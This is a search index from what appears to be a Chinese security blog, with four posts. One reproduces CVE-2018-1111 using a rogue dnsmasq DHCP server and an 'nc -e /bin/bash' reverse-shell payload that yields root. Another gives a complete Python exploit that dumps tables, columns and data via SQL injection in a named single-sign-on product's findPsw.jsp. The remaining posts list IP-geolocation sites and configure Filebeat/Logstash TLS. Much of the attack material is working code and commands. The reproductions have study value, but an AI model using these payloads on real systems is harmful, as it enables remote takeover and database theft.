<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[CVE-2018-1111复现]]></title>
    <url>%2F2018%2F05%2F20%2FCVE-2018-1111%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[漏洞原理DynoRoot：Red Hat DHCP客户端命令执行漏洞(CVE-2018-1111)预警 复现环境 Parallels Desktop kali（攻击机） centos 7（目标主机） 注意： 关闭Parallels Desktoppd host-only模式下的dhcp 开启两台虚拟机，网络模式选择host-only 攻击机配置kali上配置ip信息：12ifconfig eth0 192.168.2.222 netmask 255.255.255.0route add default gw 192.168.2.222 kali上使用nc监听520端口（今天520^^） 1nc -l -p 520 -v 创建一个dnsmasq.conf文件123456789101112131415bind-interfacesinterface=eth0except-interface=lodhcp-range=192.168.2.10,192.168.2.30,22hdhcp-option=3,192.168.2.222dhcp-option=6,192.168.2.222log-querieslog-facility=/var/log/dnsmasq.log 攻击kali机器上运行dnsmasq来伪造dhcp服务器，发起攻击包，这里用nc反弹shell 1dnsmasq -dC dnsmasq.conf --dhcp-option=&quot;252,&apos;&amp;nc -e /bin/bash 192.168.2.222 520 #&quot; dnsmasq运行效果: 此时centos机器获取到了kali机器分配的ip地址： kali端收到了反弹的shell，root权限： 修复方式idc机器一般都是固定ip，不会使用dhcp，但有些云主机会使用到dhclient，需要升级处理。1yum update dhclient]]></content>
      <tags>
        <tag>Testing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[几个高精度IP定位网站]]></title>
    <url>%2F2018%2F05%2F08%2F%E5%87%A0%E4%B8%AA%E9%AB%98%E7%B2%BE%E5%BA%A6IP%E5%AE%9A%E4%BD%8D%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[几个高精度IP定位网站：https://ip.rtbasia.com/https://www.opengps.cn/Data/IP/LocHighAcc.aspxhttp://www.ipplus360.com/]]></content>
  </entry>
  <entry>
    <title><![CDATA[Filebeat&Logstash加密传输配置]]></title>
    <url>%2F2017%2F08%2F08%2FFilebeat-Logstash%E5%8A%A0%E5%AF%86%E4%BC%A0%E8%BE%93%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[elastic stack yum源123456789101112# rpm --import https://packages.elastic.co/GPG-KEY-elasticsearch# cat &gt; /etc/yum.repos.d/elastic.repo &lt;&lt; EOF[elasticsearch-6.x]name=Elasticsearch repository for 6.x packagesbaseurl=https://artifacts.elastic.co/packages/6.x/yumgpgcheck=1gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearchenabled=1autorefresh=1type=rpm-mdEOF 生成证书修改openssl.cnf 找到 [ v3_ca ]加入下边一行： 123vi /etc/pki/tls/openssl.cnfsubjectAltName = IP:这里写ip地址 然后生成证书1openssl req -subj &apos;/CN=ossec-hw-215/&apos; -x509 -days $((100 * 365)) -batch -nodes -newkey rsa:2048 -keyout /etc/pki/tls/private/filebeat_215.key -out /etc/pki/tls/certs/filebeat_215.crt filebeat.yml配置12345678910111213141516#----------------------------- Logstash output --------------------------------output.logstash: # The Logstash hosts hosts: [&quot;192.168.1.100:50055&quot;] # Optional SSL. By default is off. # List of root certificates for HTTPS server verifications ssl.certificate_authorities: [&quot;/etc/pki/tls/certs/logstash.crt&quot;] # Certificate for SSL client authentication ssl.certificate: &quot;/etc/pki/tls/certs/filebeat_73.crt&quot; # Client Certificate Key ssl.key: &quot;/etc/pki/tls/private/filebeat_73.key&quot;`]]></content>
      <tags>
        <tag>Testing</tag>
        <tag>入侵检测</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个SQL注入利用]]></title>
    <url>%2F2016%2F05%2F08%2F%E4%B8%80%E4%B8%AASQL%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[入职你司不久，发现你司一通用产品sql注入： sqlmap无果: 123456789101112131415161718192021222324252627282930313233343536373839404142GET parameter &apos;orderNumber&apos; is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection point(s) with a total of 352 HTTP(s) requests:---Parameter: orderNumber (GET) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause Payload: orderNumber=-4408&apos; OR 9629=9629-- zPSx Type: error-based Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause Payload: orderNumber=XSDD000006&apos; AND 7053=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(122)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7053=7053) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(107)+CHAR(118)+CHAR(113)))-- FHQv---[10:24:29] [INFO] testing Microsoft SQL Server[10:24:31] [WARNING] the back-end DBMS is not Microsoft SQL Server[10:24:31] [INFO] testing MySQL[10:24:31] [WARNING] the back-end DBMS is not MySQL[10:24:31] [INFO] testing Oracle[10:24:32] [WARNING] the back-end DBMS is not Oracle[10:24:32] [INFO] testing PostgreSQL[10:24:32] [WARNING] the back-end DBMS is not PostgreSQL[10:24:32] [INFO] testing SQLite[10:24:32] [WARNING] the back-end DBMS is not SQLite[10:24:32] [INFO] testing Microsoft Access[10:24:33] [WARNING] the back-end DBMS is not Microsoft Access[10:24:33] [INFO] testing Firebird[10:24:33] [WARNING] the back-end DBMS is not Firebird[10:24:33] [INFO] testing SAP MaxDB[10:24:33] [WARNING] the back-end DBMS is not SAP MaxDB[10:24:33] [INFO] testing Sybase[10:24:33] [WARNING] the back-end DBMS is not Sybase[10:24:33] [INFO] testing IBM DB2[10:24:34] [WARNING] the back-end DBMS is not IBM DB2[10:24:34] [INFO] testing HSQLDB[10:24:34] [WARNING] the back-end DBMS is not HSQLDB or version is &lt; 1.7.2[10:24:34] [CRITICAL] sqlmap was not able to fingerprint the back-end database management system[10:24:34] [WARNING] HTTP error codes detected during run:408 (Request Timeout) - 3 times 尝试自写了exp,跑出数据库信息： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155#coding=utf-8import urllib2import socketimport requestsfrom optparse import OptionParserimport time print &apos;&apos;&apos; _____ _____ _ _ _____ _ _ _____ _____ _____|_ _| / _ \ | | | | / ___| | | | | / ___/ | ____| / ___| | | | | | | | | | | | | | |_| | | |___ | |__ | | | | | | | | | | | | | | | _ | \___ \ | __| | | | | | |_| | | |_| | | |___ | | | | ___| | | |___ | |___ |_| \_____/ \_____/ \_____| |_| |_| /_____/ |_____| \_____|&apos;&apos;&apos;print &apos;&apos;&apos;Obtaining the database now!&apos;&apos;&apos; parser = OptionParser()parser.add_option(&quot;-u&quot;, &quot;--url&quot;, dest=&quot;targeturl&quot;, help=&quot;target url&quot;,type=&quot;string&quot;)parser.add_option(&quot;-t&quot;, &quot;--table&quot;, dest=&quot;table&quot;, help=&quot;target table&quot; )parser.add_option(&quot;-c&quot;, &quot;--column&quot;, dest=&quot;column&quot;, help=&quot;target column&quot;)parser.add_option(&quot;-q&quot;, &quot;--quiet&quot;, action=&quot;store_false&quot;, dest=&quot;verbose&quot;, default=True, help=&quot;don&apos;t print status messages to stdout&quot;) (options, args) = parser.parse_args() def main(): global targeturl targeturl = options.targeturl global targettable targettable =options.table global targetcol targetcol = options.column #if options.table != None: if options.targeturl == None : print &quot;it does not work! use -h to get on&quot; else: if targeturl != None and targettable == None and targetcol == None: gettables() if targettable != None and targetcol == None: getcolumn() if targettable != None and targetcol != None: dumpdata() else: print &quot;it does not work! use -h to get on&quot; def gettables(): id = range(1,3000) exp1 = &quot;/eassso/findPsw.jsp?dataCenter=test&amp;userNO=administrator\&apos;&quot; exp2 = urllib2.quote(&quot;) AND (select top 1 name from sysobjects where name not in (select top &quot;) exp3 = urllib2.quote(&quot; name from sysobjects))=1&quot;) now = time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;,time.localtime(time.time())) f = open(&quot;/explogs/table.log&quot;, &apos;wb&apos;) f.write(&apos;------SQL Injection Result------\n&apos;) f.write(now+&apos;\n&apos;) f.close() for i in id: timeout = 5 sleep_time = 0.05 time.sleep(sleep_time) # 这里时间自己设定 exp = urllib2.urlopen(str(targeturl)+str(exp1)+str(exp2)+str(i)+str(exp3)) info = exp.read() if &quot;type&quot; in info: print str(i)+&quot;:&quot;, tag1 = info.find(&apos;\&apos;&apos;) tag1 = tag1 + 1 tag2 = info.find(&apos;\&apos;&apos;, tag1) result = info[tag1:tag2] print result d = open(&quot;/explogs/table.log&quot;, &apos;a&apos;) d.write(str(i)+&apos;:&apos;+result+&apos;\n&apos;) d.close() else: print &quot;over&quot; def getcolumn(): id = range(1,3000) #targeturl = options.targeturl exp1 = &quot;/eassso/findPsw.jsp?dataCenter=test&amp;userNO=administrator\&apos;&quot; exp2 = urllib2.quote(&quot;) AND (SELECT top 1 c.name FROM syscolumns c,sysobjects s WHERE c.id=s.id AND s.name=\&apos;&quot;) exp3 = urllib2.quote(&quot;\&apos; and c.name not in (SELECT top &quot;) exp4 = urllib2.quote(&quot; c.name FROM syscolumns c,sysobjects s WHERE c.id=s.id AND s.name=\&apos;&quot;) exp5 = urllib2.quote(&quot;\&apos;) )=1&quot;) now = time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;,time.localtime(time.time())) f = open(&quot;/explogs/col.log&quot;, &apos;wb&apos;) f.write(&apos;------SQL Injection Result------\n&apos;) f.write(now+&apos;\n&apos;) f.close() for i in id: timeout = 5 sleep_time = 0.05 time.sleep(sleep_time) # 这里时间自己设定 exp = urllib2.urlopen(str(targeturl)+str(exp1)+str(exp2)+str(targettable)+str(exp3)+str(i)+str(exp4)+str(targettable)+str(exp5)) info = exp.read() if &quot;type&quot; in info: print str(i)+&quot;:&quot;, tag1 = info.find(&apos;\&apos;&apos;) tag1 = tag1 + 1 tag2 = info.find(&apos;\&apos;&apos;, tag1) result = info[tag1:tag2] print result d = open(&quot;/explogs/col.log&quot;, &apos;a&apos;) d.write(str(i)+&apos;:&apos;+result+&apos;\n&apos;) d.close() else: print &quot;over&quot; def dumpdata(): id = range(1,3000) exp1 = &quot;/eassso/findPsw.jsp?dataCenter=test&amp;userNO=administrator\&apos;&quot; exp2 = urllib2.quote(&quot;) AND (select top 1 &quot;) #targetcol exp3 = urllib2.quote(&quot; from &quot;) #targettable exp4 = urllib2.quote(&quot; where &quot;) #targetcol exp5 = urllib2.quote(&quot; not in (SELECT TOP &quot;) #i #targetcol exp6 = urllib2.quote(&quot; FROM &quot;) #targettable exp7 = urllib2.quote(&quot; ) )=1&quot;) now = time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;,time.localtime(time.time())) f = open(&quot;/explogs/data.log&quot;, &apos;wb&apos;) f.write(&apos;------SQL Injection Result------\n&apos;) f.write(now+&apos;\n&apos;) f.close() for i in id: timeout = 5 sleep_time = 0.05 time.sleep(sleep_time) # 这里时间自己设定 exp = urllib2.urlopen(str(targeturl)+str(exp1)+str(exp2)+str(targetcol)+str(exp3)+str(targettable)+str(exp4)+str(targetcol)+str(exp5)+str(i)+str(targetcol)+str(exp6)+str(targettable)+str(exp7)) info = exp.read() if &quot;type&quot; in info: print str(i)+&quot;:&quot;, tag1 = info.find(&apos;\&apos;&apos;) tag1 = tag1 + 1 tag2 = info.find(&apos;\&apos;&apos;, tag1) result = info[tag1:tag2] print result d = open(&quot;/explogs/data.log&quot;, &apos;a&apos;) d.write(str(i)+&apos;:&apos;+result+&apos;\n&apos;) d.close() else: print &quot;over&quot;if __name__ == &apos;__main__&apos;: main() 效果：]]></content>
      <tags>
        <tag>PenTesting</tag>
      </tags>
  </entry>
</search>
